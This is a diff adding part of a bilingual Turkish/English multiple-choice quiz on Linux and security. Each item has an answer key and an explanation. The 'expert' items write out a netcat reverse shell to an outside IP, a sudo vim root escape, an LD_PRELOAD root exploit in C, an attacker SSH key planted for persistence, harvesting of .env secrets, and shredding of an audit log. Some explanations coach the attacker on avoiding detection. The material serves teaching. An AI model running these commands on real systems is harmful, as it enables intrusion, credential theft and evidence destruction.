+        "options": [
+          {
+            "tr": "Çok sayıda dosya varken '\\;' her dosya için ayrı bir rm süreci başlatır ve sistemi aşırı yavaşlatır; '+' kullanılmalıdır",
+            "en": "Using '\\;' spawns a separate rm process for every file; using '+' batches execution efficiently"
+          },
+          {
+            "tr": "rm -f parametresi find ile çalışmaz",
+            "en": "rm -f does not work with find"
+          },
+          {
+            "tr": "Sözdizimi hatası verir",
+            "en": "Throws syntax error"
+          },
+          {
+            "tr": "Log dosyaları silinemez",
+            "en": "Log files cannot be deleted"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "-exec cmd {} \\; her dosya için yeni bir fork/exec yapar (10.000 dosya = 10.000 işlem). -exec cmd {} + ise argümanları birleştirerek tek bir komutla toplu çalıştırır (xargs gibi), binlerce kat daha hızlıdır.",
+          "en": "Terminating with \\; spawns a separate process per file. Terminating with + batches arguments together efficiently."
+        }
+      }
+    ],
+    "expert": [
+      {
+        "topic": "privesc",
+        "code": "sudo -u root vim\n:!/bin/sh",
+        "options": [
+          {
+            "tr": "Vim içinden '!/bin/sh' komutunu çalıştırmak root yetkili etkileşimli bir kabuk açarak sudo kısıtlamasını baypas eder",
+            "en": "Invoking '!/bin/sh' from within root-privileged Vim drops into an interactive root shell (GTFOBins)"
+          },
+          {
+            "tr": "Vim kabuk komutlarını çalıştıramaz",
+            "en": "Vim cannot execute shell commands"
+          },
+          {
+            "tr": "Sözdizimi hatası verir",
+            "en": "Throws syntax error"
+          },
+          {
+            "tr": "Vim kilitlenir",
+            "en": "Vim crashes"
+          }
+        ],
+        "answer": 0,
+        "bugError": "Security Bypass: GTFOBins Vim escape",
+        "explanation": {
+          "tr": "Sistem yöneticisinin kullanıcıya şifresiz vim çalıştırma izni vermesi en büyük yapılandırma hatasıdır (misconfiguration). Vim içindeki :! komutu root yetkileriyle alt kabuk çalıştırır ve tam bir sistem ele geçirme (privesc) sağlar.",
+          "en": "Granting sudo on vim allows trivial shell escapes via ':!/bin/sh', yielding root access immediately."
+        }
+      },
+      {
+        "topic": "crypto_tunnel",
+        "code": "mkfifo /tmp/f\ncat /tmp/f | /bin/sh -i | nc 10.10.14.2 4444 > /tmp/f",
+        "options": [
+          {
+            "tr": "2>&1 (stderr yönlendirmesi) eksiktir; hata mesajları saldırganın netcat ekranında görünmez ve bazı komutlar sessizce başarısız olur",
+            "en": "Missing 2>&1 stderr redirection; error outputs will not be forwarded to attacker's netcat terminal"
+          },
+          {
+            "tr": "mkfifo adlandırılmış boru oluşturamaz",
+            "en": "mkfifo cannot create named pipes"
+          },
+          {
+            "tr": "nc ile /tmp/f yönlendirilemez",
+            "en": "nc cannot redirect to /tmp/f"
+          },
+          {
+            "tr": "Sözdiziminde hiçbir hata yoktur",
+            "en": "There is no error in syntax"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Kabuk hata mesajlarını stderr (dosya tanıtıcısı 2) üzerinden basar. '/bin/sh -i 2>&1' yazılmazsa girilen yanlış komutların veya izin hatalarının çıktıları saldırgana değil, hedef makinenin görünmeyen konsoluna düşer.",
+          "en": "Failing to redirect 2>&1 means error streams are lost, leaving the attacker blind to command execution failures."
+        }
+      },
+      {
+        "topic": "privesc",
+        "code": "find / -perm /4000 2>/dev/null",
+        "options": [
+          {
+            "tr": "Eski GNU find sürümlerinde '+4000' kullanılırdı; modern sürümlerde '-4000' veya '/4000' kullanılır ancak -type f eklenmezse dizinler de listelenir",
+            "en": "Without '-type f', searches will include SUID directories (directories with special permissions) producing noisy results"
+          },
+          {
+            "tr": "4000 yerine 2000 yazılmalıdır",
+            "en": "2000 must be used instead of 4000"
+          },
+          {
+            "tr": "find ile SUID aranamaz",
+            "en": "find cannot search SUID"
+          },
+          {
+            "tr": "Sözdizimi hatası verir",
+            "en": "Throws syntax error"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "SUID aramalarında '-type f' (regular file) eklenmezse çıktıda soketler, dizinler ve özel dosyalar karışıklık yaratır. Temiz keşif için: 'find / -perm -4000 -type f 2>/dev/null'.",
+          "en": "Omitting '-type f' contaminates results with non-regular files and directory artifacts."
+        }
+      },
+      {
+        "topic": "privesc",
+        "code": "cat << 'EOF' > /tmp/exploit.c\n#include <unistd.h>\nvoid _init() {\n  setuid(0);\n  system(\"/bin/sh\");\n}\nEOF\ngcc -fPIC -shared -o /tmp/exploit.so /tmp/exploit.c -nostartfiles\nsudo LD_PRELOAD=/tmp/exploit.so ls",
+        "options": [
+          {
+            "tr": "Eğer sudoers dosyasında 'env_keep += LD_PRELOAD' etkinleştirilmemişse, sudo güvenlik gereği LD_PRELOAD ortam değişkenini sıfırlar ve exploit çalışmaz",
+            "en": "Unless 'env_keep += LD_PRELOAD' is explicitly enabled in sudoers, sudo strips LD_PRELOAD for security"
+          },
+          {
+            "tr": "gcc paylaşımlı kütüphane (.so) derleyemez",
+            "en": "gcc cannot compile shared libraries"
+          },
+          {
+            "tr": "setuid(0) C dilinde yasaktır",
+            "en": "setuid(0) is illegal in C"
+          },
+          {
+            "tr": "Sözdizimi hatası verir",
+            "en": "Throws syntax error"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Modern sudo varsayılan olarak tehlikeli ortam değişkenlerini (LD_PRELOAD, LD_LIBRARY_PATH) temizler. Bu tekniğin çalışabilmesi için 'sudo -l' çıktısında 'env_keep += LD_PRELOAD' direktifinin açıkça görünmesi gerekir.",
+          "en": "Default sudo configurations sanitize the execution environment, stripping LD_PRELOAD unless env_keep is explicitly configured."
+        }
+      },
+      {
+        "topic": "networking",
+        "code": "iptables -F",
+        "options": [
+          {
+            "tr": "Varsayılan politika DROP ise, -F (flush) tüm kuralları siler ve sunucuya olan TÜM ağ/SSH erişimi anında kesilerek sunucu kilitlenir!",
+            "en": "If default policy is DROP, flushing (-F) rules instantly severs ALL SSH/network access, locking out admins!"
+          },
+          {
+            "tr": "Güvenlik duvarını hızlandırır",
+            "en": "Accelerates firewall"
+          },
+          {
+            "tr": "Sadece giden trafiği temizler",
+            "en": "Only flushes outbound traffic"
+          },
+          {
+            "tr": "Sözdizimi hatası verir",
+            "en": "Throws syntax error"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Sistem yöneticilerinin en korktuğu tuzaktır. Eğer varsayılan INPUT politikası DROP olarak ayarlanmışsa ve 'iptables -F' ile izin kuralları silinirse, gelen tüm paketler reddedilir ve uzaktan SSH bağlantısı anında kopar.",
+          "en": "Flushing iptables while the default policy remains DROP severs all incoming SSH connections immediately, causing lockout."
+        }
+      },
+      {
+        "topic": "privesc",
+        "code": "cat /etc/passwd | awk -F: '$2 == \"\" {print $1}'",
+        "options": [
+          {
+            "tr": "Modern Linux'ta parolalar /etc/shadow içinde tutulur, bu nedenle /etc/passwd dosyasında 2. alan hemen her zaman 'x'tir",
+            "en": "Modern Linux stores hashes in /etc/shadow; field 2 in /etc/passwd is almost universally 'x'"
+          },
+          {
+            "tr": "/etc/passwd içinde şifresiz kullanıcı aranamaz",
+            "en": "Cannot search passwordless users in /etc/passwd"
+          },
+          {
+            "tr": "awk komutu bu dosyayı okuyamaz",
+            "en": "awk cannot read this file"
+          },
+          {
+            "tr": "Sözdizimi hatası verir",
+            "en": "Throws syntax error"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Eski Unix sistemlerinde parolalar /etc/passwd dosyasındaydı. Modern sistemlerde şifreler /etc/shadow'a taşındı ve passwd dosyasındaki parola alanına sadece 'x' harfi konuldu. Boş parola kontrolü /etc/shadow üzerinden yapılmalıdır.",
+          "en": "Shadow passwords relocated credentials to /etc/shadow, leaving 'x' as a placeholder in /etc/passwd."
+        }
+      },
+      {
+        "topic": "crypto_tunnel",
+        "code": "echo \"ssh-ed25519 AAAAC3... attacker@kali\" > ~/.ssh/authorized_keys",
+        "options": [
+          {
+            "tr": "'>' operatörü mevcut tüm yetkili anahtarları siler; birden fazla anahtar barındırmak ve mevcudu korumak için '>>' kullanılmalıdır",
+            "en": "'>' overwrites authorized_keys, obliterating existing legitimate keys; persistence should append '>>'"
+          },
+          {
+            "tr": "authorized_keys dosyasına Ed25519 anahtarı eklenemez",
+            "en": "Ed25519 keys cannot be in authorized_keys"
+          },
+          {
+            "tr": "Sözdizimi hatası verir",
+            "en": "Throws syntax error"
+          },
+          {
+            "tr": "SSH servisi çöker",
+            "en": "SSH service crashes"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Saldırgan yetki yükselttikten sonra kendi anahtarını eklerken '>' kullanırsa sunucunun asıl yöneticisinin anahtarını silmiş olur. Bu durum anında alarm verilmesine ve saldırının fark edilmesine yol açar. '>>' kullanılmalıdır.",
+          "en": "Using '>' wipes legitimate administrative keys, immediately raising alarms during intrusion persistence."
+        }
+      },
+      {
+        "topic": "privesc",
+        "code": "find / -name \".env\" 2>/dev/null | xargs cat",
+        "options": [
+          {
+            "tr": "Dosya adlarında boşluk veya özel karakterler varsa xargs ayrıştırma hatası verir; 'find -print0 | xargs -0' kullanılmalıdır",
+            "en": "Filenames containing spaces cause xargs parsing errors; 'find -print0 | xargs -0' should be used"
+          },
+          {
+            "tr": ".env dosyaları xargs ile okunamaz",
+            "en": ".env files cannot be read via xargs"
+          },
+          {
+            "tr": "xargs dosyaları siler",
+            "en": "xargs deletes files"
+          },
+          {
+            "tr": "Sözdizimi hatası verir",
+            "en": "Throws syntax error"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "Linux'ta dosya isimlerinde boşluk, tırnak veya yeni satır bulunabilir. Standart xargs boşlukları ayraç sandığı için hata verir. Siber güvenlik otomasyonlarında altın kural daima 'find ... -print0 | xargs -0 ...' (null byte sınırlayıcı) kullanmaktır.",
+          "en": "Spaces in filenames break default xargs parsing. Robust pipelines always pair 'find -print0' with 'xargs -0'."
+        }
+      },
+      {
+        "topic": "bash_scripting",
+        "code": "eval \"$USER_INPUT\"",
+        "options": [
+          {
+            "tr": "Kullanıcı girdisini 'eval' ile çalıştırmak doğrudan Komut Enjeksiyonuna (Command Injection / RCE) yol açan en tehlikeli güvenlik açığıdır",
+            "en": "Executing user-supplied input via 'eval' is a catastrophic Remote Code Execution (RCE) / Command Injection flaw"
+          },
+          {
+            "tr": "eval komutu değişkenleri okuyamaz",
+            "en": "eval cannot read variables"
+          },
+          {
+            "tr": "Sözdizimi hatası verir",
+            "en": "Throws syntax error"
+          },
+          {
+            "tr": "eval çıktıyı ekrana basmaz",
+            "en": "eval suppresses output"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "'eval' komutu parametre olarak aldığı dizeyi doğrudan kabukta kod olarak çalıştırır. Eğer $USER_INPUT değişkeni dışarıdan geliyorsa saldırgan '; rm -rf /' veya '; bash -i ...' enjekte ederek tam sistem kontrolü elde eder.",
+          "en": "eval evaluates and executes strings as shell code. Passing untrusted input to eval provides unauthenticated RCE."
+        }
+      },
+      {
+        "topic": "forensics",
+        "code": "shred -u -z -n 3 audit.log",
+        "options": [
+          {
+            "tr": "Dosyayı 3 kez rastgele veriyle, 1 kez sıfırlarla (-z) üzerine yazıp siler (-u), ancak 'ext4' gibi günlüklemeli (journaling) dosya sistemlerinde veri kalıntıları kalabilir",
+            "en": "Overwrites file 3 times with noise plus zeros (-z) and unlinks (-u), but journaling filesystems (ext4) may still retain data"
+          },
+          {
+            "tr": "shred dosyayı şifreler",
+            "en": "shred encrypts the file"
+          },
+          {
+            "tr": "shred komutunda -z parametresi yoktur",
+            "en": "-z does not exist in shred"
+          },
+          {
+            "tr": "Sözdizimi hatası verir",
+            "en": "Throws syntax error"
+          }
+        ],
+        "answer": 0,
+        "explanation": {
+          "tr": "shred güvenli dosya silme aracıdır. Ancak man sayfasında açıkça belirtildiği üzere: ext3/ext4 gibi günlükleme (journaling) yapan dosya sistemlerinde veya SSD'lerde (wear leveling) verinin eski kopyaları disk bloklarında kalmaya devam edebilir.",
+          "en": "shred overwrites data blocks, but modern journaling filesystems and wear-leveling SSDs can preserve ghost copies."
+        }
+      }
+    ]
+  }
+}
